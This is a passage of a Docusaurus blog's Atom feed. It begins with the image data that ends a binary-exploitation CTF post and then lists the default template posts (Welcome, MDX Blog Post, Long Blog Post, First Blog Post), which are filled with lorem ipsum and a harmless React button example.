1sNOvpkDREHhPUZRecuCAo2Z7rcW27mfM+S38Dy7QlPe/pajuRvwiEJNW9O0ih+XopJIfBzF46d5/WaugsL7g6LylhUSxhbWFDbWYF6/NbXMo7kQEJ2nS3NK8SeBC47TcflgMlNPuWFuouXc6GYM3Zh338D5Go0dI8/9Q//KGd3F1RK4pCudp1814JvJ7xB5OT8GtJWlylt+j7tkzddbTjC1uZqEqLtcXP0Tv53M2zV/RclL4Q1jQtGPymNtkuHjRsSHBRIY+tobNPmEvJyf99WWQnooxV9BQUEhH/J+PGysoKCgoKAXSvHPj0iFqdbvByYPrqnc9FFQyKf8H4chIWzX/QRNAAAAAElFTkSuQmCC" width="383" height="64" class="img_E7b_"></p>]]></content>
        <author>
            <name>Christopher Nguyen</name>
            <uri>https://github.com/christopher-nguyen-re</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Binary Exploitation" term="Binary Exploitation"/>
        <category label="Pico CTF" term="Pico CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Welcome]]></title>
        <id>welcome</id>
        <link href="https://christopher-nguyen-re.github.io/blog/welcome"/>
        <updated>2021-08-26T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Docusaurus blogging features are powered by the blog plugin.]]></summary>
        <content type="html"><![CDATA[<p><a href="https://docusaurus.io/docs/blog" target="_blank" rel="noopener noreferrer">Docusaurus blogging features</a> are powered by the <a href="https://docusaurus.io/docs/api/plugins/@docusaurus/plugin-content-blog" target="_blank" rel="noopener noreferrer">blog plugin</a>.</p><p>Simply add Markdown files (or folders) to the <code>blog</code> directory.</p><p>Regular blog authors can be added to <code>authors.yml</code>.</p><p>The blog post date can be extracted from filenames, such as:</p><ul><li><code>2019-05-30-welcome.md</code></li><li><code>2019-05-30-welcome/index.md</code></li></ul><p>A blog post folder can be convenient to co-locate blog post images:</p><p><img loading="lazy" alt="Docusaurus Plushie" src="/assets/images/docusaurus-plushie-banner-a60f7593abca1e3eef26a9afa244e4fb.jpeg" width="1500" height="500" class="img_E7b_"></p><p>The blog supports tags as well!</p><p><strong>And if you don't want a blog</strong>: just delete this directory, and use <code>blog: false</code> in your Docusaurus config.</p>]]></content>
        <author>
            <name>Sébastien Lorber</name>
            <uri>https://sebastienlorber.com</uri>
        </author>
        <author>
            <name>Yangshun Tay</name>
            <uri>https://github.com/yangshun</uri>
        </author>
        <category label="facebook" term="facebook"/>
        <category label="hello" term="hello"/>
        <category label="docusaurus" term="docusaurus"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[MDX Blog Post]]></title>
        <id>mdx-blog-post</id>
        <link href="https://christopher-nguyen-re.github.io/blog/mdx-blog-post"/>
        <updated>2021-08-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Blog posts support Docusaurus Markdown features, such as MDX.]]></summary>
        <content type="html"><![CDATA[<p>Blog posts support <a href="https://docusaurus.io/docs/markdown-features" target="_blank" rel="noopener noreferrer">Docusaurus Markdown features</a>, such as <a href="https://mdxjs.com/" target="_blank" rel="noopener noreferrer">MDX</a>.</p><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><p>Use the power of React to create interactive blog posts.</p><div class="codeBlockContainer_I0IT language-js theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-js codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">button onClick</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token arrow operator" style="color:#393A34">=&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">alert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'button clicked!'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">}</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token maybe-class-name">Click</span><span class="token plain"> me</span><span class="token operator" style="color:#393A34">!</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">button</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><button>Click me!</button></div></div>]]></content>
        <author>
            <name>Sébastien Lorber</name>
            <uri>https://sebastienlorber.com</uri>
        </author>
        <category label="docusaurus" term="docusaurus"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Long Blog Post]]></title>
        <id>long-blog-post</id>
        <link href="https://christopher-nguyen-re.github.io/blog/long-blog-post"/>
        <updated>2019-05-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is the summary of a very long blog post,]]></summary>
        <content type="html"><![CDATA[<p>This is the summary of a very long blog post,</p><p>Use a <code>&lt;!--</code> <code>truncate</code> <code>--&gt;</code> comment to limit blog post size in the list view.</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p>]]></content>
        <author>
            <name>Endilie Yacop Sucipto</name>
            <uri>https://github.com/endiliey</uri>
        </author>
        <category label="hello" term="hello"/>
        <category label="docusaurus" term="docusaurus"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[First Blog Post]]></title>
        <id>first-blog-post</id>
        <link href="https://christopher-nguyen-re.github.io/blog/first-blog-post"/>
        <updated>2019-05-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet]]></summary>
        <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet</p>]]></content>
        <author>
            <name>Gao Wei</name>
            <uri>https://github.com/wgao19</uri>
        </author>
        <category label="hola" term="hola"/>
        <category label="docusaurus" term="docusaurus"/>
    </entry>
</feed>